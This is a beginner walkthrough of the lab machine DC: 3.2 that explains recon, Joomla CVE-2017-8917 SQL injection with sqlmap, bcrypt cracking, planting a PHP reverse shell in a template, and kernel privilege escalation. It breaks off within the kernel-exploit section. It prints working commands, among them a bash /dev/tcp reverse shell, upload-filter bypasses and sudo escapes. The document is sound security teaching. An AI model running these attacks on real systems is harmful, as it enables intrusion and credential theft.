# DC: 3.2 — VulnHub Walkthrough (Beginner Friendly)

> Educational, step-by-step walkthrough for students. This is the third machine in
> the **DC** series by DCAU (released as "DC: 3", re-labelled **DC: 3.2**). It is
> intentionally vulnerable and must only ever be run on an isolated lab network.

| Field | Value |
| --- | --- |
| **Machine** | DC: 3.2 |
| **Difficulty** | **2 — Very Easy** (stated: *Beginner*) |
| **Author** | DCAU |
| **Released** | 25 April 2020 (this v3.2 build; original DC-3 shipped 26 March 2019) |
| **VulnHub Entry** | <https://vulnhub.com/entry/dc-32,312/> |
| **Download** | <https://vulnhub.com/entry/dc-32,312/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux — Ubuntu 16.04 32-bit (kernel 4.4), Apache 2.4.18 + Joomla 3.7.0 |

> **Note:** exact banners, ports and file contents can differ slightly between the
> VirtualBox and VMware builds of this box ("varies by build"). The author notes
> VirtualBox works best. The attack *chain* below is stable; small details (the
> exact kernel, an admin hash) may move around. When in doubt, re-run the
> enumeration yourself.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a target host on an isolated lab network (ARP scan + Nmap).
- How to recognise a **Joomla** site and fingerprint its exact version.
- What a **SQL injection** is, using **CVE-2017-8917** (the Joomla `com_fields` bug) as the example.
- How to drive **sqlmap** to list databases, tables and rows, and pull a credential hash.
- How to crack a **bcrypt** hash with **john** / **hashcat**.
- How a convinced admin account turns into **remote code execution** via a template file.
- How to identify the OS/kernel from inside a shell and escalate to root with a **kernel exploit**.
- How to think like a defender and stop every one of the above.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import the OVA, and have the target on the **same host-only/NAT** subnet as Kali.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network. The target
> boots with DHCP, so its IP can change every time you import it — always confirm.

First look at your own interface to learn the subnet.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the `inet 192.168.56.10/24` line means *you* are on the
> `192.168.56.0/24` network, so the target shares the first three numbers.

Sweep the subnet for live hosts.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:ab:cd:ef, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.10    08:00:27:ab:cd:ef   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:12:34:56   PCS Systemtechnik GmbH
```

> **Why it works:** `arp-scan` asks every address "who has this IP?" over ARP and
> lists whoever answers. ARP is fast and generally can't be hidden by a firewall.

**Target IP:** `192.168.56.101`

![Finding the target with arp-scan](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan

Unlike DC-1 and DC-2, this box exposes **only one service** — a single web server.


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

```bash
sudo nmap -sC -sV -p 80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

> **How to read it:** `-p-` scans all TCP ports, `-sV` identifies service versions
> and `-sC` runs safe default scripts. There is exactly **one attack surface**: the
> **web server on port 80**, which the meta tag tells us is **Joomla**. Everything
> we do from here targets the web app.

![Nmap service scan output](images/02-nmap.png)

### 2.2 Fingerprint Joomla

The version is exposed in a standard file that Joomla always ships:

```bash
curl -s http://192.168.56.101/administrator/manifests/files/joomla.xml | grep -i version
curl -s http://192.168.56.101/README.txt | head -n 3
```

```text
<version>3.7.0</version>
...
Joomla! ...
```

Kali ships **joomscan**, a Joomla-specific scanner that automates this:

```bash
joomscan -u http://192.168.56.101
```

```text
[+] Detecting Joomla Version ... 3.7.0
[+] Admin URL ... http://192.168.56.101/administrator/
[+] Check for known vulnerabilities ...
[!] Joomla! 3.7.0 - CVE-2017-8917 'com_fields' SQL Injection
```

> **Why it works:** `joomscan` reads the manifest XML, finds the admin login and
> cross-references the version against known CVEs. **Joomla 3.7.0** is vulnerable
> to **CVE-2017-8917**, a serious SQL injection introduced by the new `com_fields`
> component and fixed in 3.7.1.

### 2.3 The vulnerability — CVE-2017-8917 (`com_fields` SQLi)

Joomla 3.7.0 added a `com_fields` component whose `list[fullordering]` parameter is
placed into an SQL query **without proper escaping**. An unauthenticated remote
attacker can therefore inject SQL and read (or write) anything in the database —
including the administrator password hash. The vulnerable URL looks like:

```text
http://192.168.56.101/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml
```

> **Why it works:** `list[fullordering]` is meant to be a column name used to sort a
> list. Instead of validating it, Joomla concatenates it into the query, so we can
> attach our own SQL. Nmap even detects this automatically with
> `--script http-vuln-cve2017-8917`.

![Fingerprinting Joomla and the CVE](images/03-enum.png)

---

## 3. Foothold

### 3.1 Dump the database with sqlmap

We point **sqlmap** at the vulnerable parameter. The `*` marks where sqlmap should
test the injection.


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```bash
sqlmap -u "http://192.168.56.101/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" \
       --batch --dbs
```

```text
[+] the back-end DBMS is MySQL
available databases [5]:
[*] information_schema
[*] joomladb          <-- the Joomla database
[*] mysql
[*] performance_schema
[*] sys
```

> **Why it works:** `--dbs` asks sqlmap to enumerate database names. It confirms the
> injection and shows us the database that matters: **`joomladb`**.

Now list its tables and find the user table:

```bash
sqlmap -u "http://192.168.56.101/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" \
       --batch -D joomladb --tables
```

```text
Database: joomladb
[76 tables]
+-------------------------+
| #__users                |   <-- the administrator accounts live here
| #__user_usergroup_map   |
| #__content              |
| ...                     |
+-------------------------+
```

> **Why it works:** `-D joomladb --tables` lists every table in that database.
> Joomla prefixes tables with `#__`, and `#__users` stores usernames and
> password hashes.

### 3.2 Extract the administrator hash

```bash
sqlmap -u "http://192.168.56.101/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" \
       --batch -D joomladb -T '#__users' -C id,username,password --dump
```

```text
Database: joomladb
Table: #__users
[1 entry]
+------+--------------------------------------------------------------+----------+
| id   | password                                                     | username |
+------+--------------------------------------------------------------+----------+
|  629 | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    |
+------+--------------------------------------------------------------+----------+
```

> **Why it works:** `-T` selects the table, `-C` selects the columns and `--dump`
> prints the rows. The password is stored as a **bcrypt** hash — the `$2y$10$`
> prefix means "bcrypt, cost 10". Bcrypt hashes are salted and deliberately slow,
> but that only slows cracking; it does not prevent it.

**Alternative:** the `Joomblah` proof-of-concept does the same thing in one shot:

```bash
git clone https://github.com/XiphosResearch/exploits
python2 exploits/Joomblah/joomblah.py http://192.168.56.101
```

### 3.3 Crack the bcrypt hash


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

```text
admin:snoopy
```

> **Why it works:** `john` recognises the `$2y$` bcrypt format automatically and
> tries every word in `rockyou.txt` as a potential password, re-hashing each with
> the stored salt and comparing. The password `snoopy` is in the list. With
> `hashcat` the equivalent command is
> `hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`.

### 3.4 Log in and get a shell via a template

Log in to the Joomla administrator panel:

```text
http://192.168.56.101/administrator/
username: admin
password: snoopy
```

Once inside, an administrator can **edit the PHP of the site's templates**. We abuse
that to drop a PHP reverse shell:

1. Go to **Extensions → Templates → Templates**.
2. Open the **protostar** template, then open a writable PHP file (e.g. `error.php`),
   or use **New File** to create `shell.php`.
3. Replace the file contents with a PHP reverse shell — Kali ships one:


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
# edit ~/shell.php: set $ip = '192.168.56.10' and $port = 4444
```

4. Paste it into the template editor and click **Save**.
5. Start a listener on Kali, then request the file in the browser.

```bash
nc -lvnp 4444
```

```bash
curl http://192.168.56.101/templates/protostar/shell.php
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 48210
Linux dc-3 4.4.0-21-generic #37-Ubuntu SMP ... i686 GNU/Linux
www-data@dc-3:/var/www/html/templates/protostar$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the template file is served by Apache, which **executes** the PHP
> it contains. Because that PHP is our reverse shell, it connects back to Kali — and
> the web server runs it as its own account, `www-data`. Our first shell. (This box
> also has a known Metasploit module, `exploit/unix/webapp/joomla_comfields_sqli_rce`,
> which needs a logged-in admin — a good second technique to practise.)

Upgrade to a proper TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl+Z  →  stty raw -echo; fg  →  export TERM=xterm
```

![Reverse shell as www-data](images/04-foothold.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Enumerate the local system

```bash
id
cat /etc/issue
uname -a
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Ubuntu 16.04 LTS \n \l
Linux dc-3 4.4.0-21-generic #37-Ubuntu SMP ... i686 GNU/Linux
```

> **Why it matters:** the box runs **Ubuntu 16.04** with an old **4.4 kernel**. Old
> kernels are prime targets for local privilege-escalation exploits. Before reaching
> for a kernel bug you should still check the "easy" wins:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

```text
(no sudo rights for www-data)
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec        (version 0.105 - not the vulnerable 0.101)
...
```

> **Why it works:** `sudo -l` shows nothing useful and the SUID list has no obvious
> escape (`pkexec` is the patched 0.105). That points us back to the **kernel**. Use
> `searchsploit ubuntu 16.04` to find candidates.

### 4.2 Kernel exploit — EDB 39772 (`doubleput`)

Exploit-DB **39772** is the "`double-fdput()` bpf(BPF_PROG_LOAD)" kernel
privilege-escalation exploit, which affects the 4.4 kernels in Ubuntu 16.04.


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
